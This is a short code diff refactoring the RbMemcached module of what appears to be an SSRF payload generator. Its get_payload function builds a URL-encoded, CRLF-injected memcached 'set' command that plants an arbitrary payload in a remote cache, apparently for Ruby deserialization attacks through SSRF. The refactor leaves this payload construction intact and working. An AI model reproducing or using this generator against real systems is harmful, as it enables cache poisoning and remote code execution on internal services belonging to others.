@@ -1,12 +1,13 @@
 from .base import *
+from .encoding import quote_payload
 
 class RbMemcached(GENERATOR):
+    default_port = 11211
     requirement = ["command"]
-    def __init__(self, parser,options={}):
-        if options["port"] == 0:
-            options["port"] = 11211
-        super().__init__(parser,options)
-        self.set_requirement([])
+
+    def __init__(self, parser, options=None):
+        super().__init__(parser, options)
+        self.set_requirement(self.requirement)
         arg = self.get_requirement()
         if arg.command == "":
             self.command = self.wizard()
@@ -32,6 +33,6 @@ class RbMemcached(GENERATOR):
 
 def get_payload(payload):
     payload_len = len(payload)
-    payload = urllib.parse.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
+    payload = quote_payload(payload)
     finalpayload = "%0d%0aset%20SpyD3r%204%2060%20" + str(payload_len) + "%0d%0a" + payload + "%0d%0a"
     return finalpayload
